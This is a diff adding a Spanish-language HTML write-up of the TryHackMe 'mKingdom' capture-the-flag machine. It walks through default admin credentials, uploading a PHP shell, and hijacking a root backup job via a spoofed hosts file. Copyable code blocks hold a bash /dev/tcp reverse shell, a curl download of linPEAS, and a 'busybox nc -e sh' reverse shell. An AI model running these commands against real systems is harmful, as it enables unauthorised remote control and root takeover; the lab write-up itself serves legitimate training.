@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="es">
+   <head>
+      <meta charset="UTF-8">
+      <link rel="stylesheet" href=../css/general.css>
+      <title>mKingdom</title>
+   </head>
+   <body>
+   	<h2>mKingdom</h2>
+   	<div>
+			<div>
+				<img src="..." alt="...">
+			</div>
+
+			<section>
+				<nav>
+					<p>
+						Esta màquina es de dificultad fàcil, sin embargo tiene cuenta con una plataforma administrativa que tiene una version obsoleta, ademàs lqas credenciales de acceso a esta posiblemente serian como por defecto, ademàs que tiene contraseñas en texto claro o con un cifrado muy dèbil, asimismo cabe recalcar que se tienen procesos que solicitan contenidos para backups, los cuales pueden ser modificados, debido a los permisos de los archivos
+					</p>
+					<p>
+						Para comenzar, es necesario encender la maquina en la plataforma <b>TryHakme</b> y tener el archivo <b>*.openvpn</b> en nuestro dispositivo
+					</p>
+					<p>
+						Primeramente empezamos, verificando el <b>ttl</b> de la màquina remota y la conecciòn a la misma , haciendo un pineo
+					</p>
+				</nav>
+				<div>
+					<img src="../imagenes/mKingdom/pineo.png" alt="Pineo a màquina">
+					<nav>
+						<p>
+							Por consiguiente a verificar los puertos abiertos que tiene la màquina haciendo un escaneo con <b>nmap</b>, teniendose asi solo un puerto el <b>85</b>
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/primEscan.png" alt="Primer escaneo">
+					 <nav>
+                  <p>
+                  	Después de concluir el primer escaneo, tenemos uno màs especìfico el cual es al puerto ya mencionado, lanzando los scripts de <b>nmap</b> y tratando de verificar las versiones del servicio que corre en este para determinar si son vulnerables    
+                  </p>
+               </nav>
+               <img src="../imagenes/mKingdom/segEscan.png" alt="Segundo escaneo">
+               <nav>
+						<p>
+							Despues de revisar, no se cuenta con mucho, pero se identifica el servicio que corre como una web
+						</p>
+               </nav>
+               <img src="../imagenes/mKingdom/web.png" alt="Web">
+               <nav>
+						<p>
+							Posterior a la verificaciòn de la misma, esta no contiene mucho, solo es algo estático y no nos lleva a ningun lugar, por lo que aplicando Fuzzing con <b>ffuf</b> he llegado a encontrar una web interna <i>app</i>
+						</p>
+               </nav>
+               <img src="../imagenes/mKingdom/fuzz.png" alt="Fuzzing ffuf">
+               <nav>
+						<p>
+							Después de abrir  la pàgina nueva se tiene un botón en el centro, al cual al darle click nos presenta un alert, como el siguiente
+						</p>
+               </nav>
+               <img src="../imagenes/mKingdom/prevWeb.png" alt="Json web">
+               <nav>
+						<p>
+							Al clickear en aceptar, esta nos lleva a una nueva web la cual tiene màs contenido, sin embargo lo que màs resalta y lo que nos va a ser ùtil de esta es que en la parte inferior tiene la palabra <i>login</i> la cual nos va aredirigir a un formulario de logeo, tal cual se aprecia
+						</p>
+               </nav>
+     				<img src="../imagenes/mKingdom/interWeb.png" alt="Web interna">
+     				<img src="../imagenes/mKingdom/logeo.png" alt="Formulario web">
+					<nav>
+						<p>
+							En este punto al probar varias contraseñas que podrian ser por defecto he llegado a encontrar quela que nos brinda acceso es <b><i>admin : password</i></b>, logrando de esta manera llegar a un panel administrativo el cual al parecer controla el contenido que se carga en la web
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/panel.png" alt="Panel admin">
+					<nav>
+						<p>
+							Después de revisarlo, se puede encontrar un apartado donde se puede configurar este panel y dentro el mismo, se tiene específicamente las configuraciones de los archivos y màs de estos
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/accesPn.png" alt="Accesos panel">
+					<img src="../imagenes/mKingdom/editEx.png" alt="Web modifica files">
+					<nav>
+						<p>
+							Al ingreas en la primera opciòn nos muestra un listado de las extensiones de archivos que se pueden subir a la web, por lo que al verificar no esta contemplado alguno que nos sea muy ùtil, motivo por el que vamos a tratar de acceder a la màquina con una reverse shell de PHP, considerando asi agregar la extenciòn <b>php</b>
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/phpex.png" alt="Agrenado extenciòn">
+					<nav>
+						<p>
+							Posteriormente, al ya haber seleccionado y cargar nuestra reverse shell, nos muestra algo como lo siguiente, donde se tiene la <i>URL</i> en la cual accedamos directamente al archivo que hemos cargado, en este caso se trata de un php interactivo, por lo que no recibiremos conecciòn ni nada por ello
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/ishell.png" alt="Interactiva shell">
+					<nav>
+						<p>
+							Como mencionaba anteriormente, esta es la pàgina de nuestra shell que cargamos en php, la cual es muy interactiva con la màquina y permite realizar varias funciones alavès con esta, desde ejecutar comandos hasta mover contenido.
+						</p>
+						<p>
+							Ya aqui podemos ejecutar directamente una shell reversa como si estuviesemos controlando la bash, para tener control sobre la màquina victima, poniendo en el comando del input de <b>CMD</b> lo siguiente
+						</p>
+					</nav>
+               <div class="codigo-container">
+               	<div class="btn_cp">
+               		<a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+						</div>
+							 <pre class="codigo">
+
+							 
+bash -c 'bash -i >& /dev/tcp/&ltIP&gt/4444 0>&1'
+							 </pre>
+					</div>
+					<img src="../imagenes/mKingdom/cshell.png" alt="Comandos shell">
+					<nav>
+						<p>
+							Al ya poner nuestra conecciòn revera en el input mencionado se procede a habilitar la escucha en nuestro dispositivo con <b>nc</b>, especificando el puerto de escucha, llegando a conectarse asì al usuario <b>www-data</b>
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/acces1.png" alt="Primer acceso">
+					<nav>
+						<p>
+							Después de lograr la conecciòn para verificar el contenido sensible o si haye algo que es vulnerable mediante un server habilitado con <b>python</b> desde mi màquina local, procedo a compartir <b>linPEAS</b>, contenido que en la màquina vìctima es descargado con <b>curl</b>
+						</p>
+					</nav>
+               <div class="codigo-container">
+                  <div class="btn_cp">
+                     <a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+                  </div>
+                      <pre class="codigo">
+
+
+curl -O &ltIP&gt:8000/linPEAS.sh
+                      </pre>
+               </div> <br>
+					<img src="../imagenes/mKingdom/linp.png" alt="Linpeas">
+					<nav>
+						<p>
+							Despues de ejcutar el programa se puede revisar que se tiene posible contenido expuesto en <i>database.php</i>
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/data.png" alt="Pass conecciòn">
+					<nav>
+						<p>
+							Al revisar este, nos encontramos con un usuario y contraseña en texto plano, con lo cual logramos la primera escalada de privilegios
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/pass.png" alt="Primera pass">
+					<nav>
+						<p>
+							Asimismo listamos usuarios para verificar cuantos haye y el interprete de consola que estos utilizan, teniendose 2 usuarios ademàs del <b>root</b>
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/users.png" alt="Listar usuarios">
+					<nav>
+						<p>
+							Al de haber logrado encontrar la contraseña revisamos el contenido de la màquina y en el directorio raiz del usuario toad, tenemos <b>.bashrc</b> donde al verificar tenemos una cadena en <i>base 64</i> al final de este archivo
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/encrypt.png" alt="Pass encryptada">
+					<nav>
+						<p>
+							Después de desencriptarlo con <i>base 64</i> la podemos tener en texto plano, la cual es la contraseña del usuario <b>mario</b>
+						</p>
+					</nav>
+               <div class="codigo-container">
+                  <div class="btn_cp">
+                     <a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+                  </div>
+                      <pre class="codigo">
+
+
+echo 'aWthVGVOVEFOdEVTCg==' | base64 -d
+                      </pre>
+               </div>
+					<nav>
+						<p>
+							Ahora que ya tenemos acceso a los usuarios normales, nos queda hacer la escalada a usuario <b>root</b>, por lo que al igual que antes habilitamos un servidor en nuestra màquina, en esta ocaciòn pasando <b>pspy64</b> para ver los procesos que se ejecutan como usuario <b>root</b> en esta màquina, <i>para hacer el proceso de pasar el archivo se hace lo mismo que con linPEAS</i> 
+						</p>
+					</nav>
+               <img src="../imagenes/mKingdom/curlp.png" alt="Descargar pspy">
+					<nav>
+						<p>
+							Logrando encontrar asì encontrar un archivo llamado <b>counter.sh</b>, del cual  hace peticiones con <b>curl</b>
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/process.png" alt="Hallazgo pspy">
+					<nav>
+						<p>
+							Verificamos lo que tiene el archivo origen y encontramos que posiblemente se trate de un backup, el cual se hace siguiendo algunos parametro, ademàs vemos los permisos de este archivo y notamos que no es editable, lo cual indica que no nos va a ser de mucha ayuda el tratar de modificarlo, sin embargo como revisamos el reporte de <b>pspy64</b> esta desacarga se hace de un dominio especifico
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/defaulsh.png" alt="Counter sh contenido">
+					<nav>
+						<p>
+							Al revisar el <i>/etc/hosts</i> podemos apreciar que aqui se encuentra estipulado el dominio del cual se hace el proceso como usuario con altos privilegios
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/hosts.png" alt="Contenido hosts">
+					<nav>
+						<p>
+							 <i>He tratado de editar directamente el contenido de /etc/hosts pero esto no ha sido posible, motivo por el que que he considerado mejor crear en el directorio /tmp un archivo con el mismo nombre</i>, en el cual he puesto mi IP de <b>Tryhackme</b> lo cual representa a mi màquina local y el dominio que se aprecia del cual se verifica contenido con <b>curl</b>, indicando asi que el recurso se obtenga de mi màquina local
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/modificateh.png" alt="Nuevo hosts">
+					<nav>
+						<p>
+							Por lo cual He creado todo el contenido que nos falta para hacer la descarga de <i>counter.sh</i>, iniciando desde app en mi maquina, tal cual como se muestra en la imagen
+						</p>
+					</nav>
+					<img src="../imagenes/mKingdom/tree.png" alt="Arbol interno">
+					<nav>
+						<p>
+							Asimismo, en el archivo final que es el script en el cual se verificaba el contenido, ponemos una reverse shell, como la siguiente, con la que podemos lograr la nueva conecciòn como <b>root</b>
+						</p>
+						<p>
+							<i>Si no se considera <b>busybox</b> no funciona la conecciòn</i>
+						</p>
+					</nav>
+               <div class="codigo-container">
+                  <div class="btn_cp">
+                     <a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+                  </div>
+                      <pre class="codigo">
+
+
+busybox nc &ltIP&gt 3333 -e sh
+                      </pre>
+               </div>
+					<nav>
+						<p>
+							Es necesario habilitar el contenido desde el punto raiz del directorio anterior es decir estando detras de <i>/app/castle/application..</i>., para que al intentar descargar el recurso <b>counter.sh</b>, la màquina victima llegue de manera exitosa a hacer la peticiòn a nuestro servidor y bajar asì nuestro recurso
+						</p>
+					</nav>
+               <img src="../imagenes/mKingdom/serv85.png" alt="Servidor con puerto 85">
+				</div>
+				<nav>
+					<p>
+						Es necesario tambien tener habilitado un puerto de escucha al puerto que se indico anteriormente en el contenido del archivo <b>counter.sh</b>, por lo que pasando un tiempo se harà la peticiòn a nuestro server y este proporcionara el contenido que hemos creado, logrando de esta manera tener una conecciòn como <b>root</b>
+					</p>
+				</nav>
+				<img src="../imagenes/mKingdom/accesroot.png" alt="Acceso como root">
+				<nav style="color: lightgreen; ">
+					<p>
+						<i> La conecciòn que se ha relizado es mediante una sh, ya que he tenido problemas si intento devolver una bash en la shell reversa, cada vez que intento abrir una flag me sale que no tengo permisos para ello por màs que sea root   </i>
+					</p>
+					<p>
+						<i> Las flags se encuentran en la direcciòn del usuario /root y en /home/mario  </i>
+					</p>
+				</nav>
+			</section>
+					
+   	</div>
+   </body>
+   <hr>
+   <footer>
+      <div>
+         Jcarlos
+      </div>
+      <div>
+         <a href="https://rb.gy/d2u7jy" target="_blank" > Linkeding </a>
+      </div>
+   </footer>
+	<script src="../js/global.js"></script>
+</html>
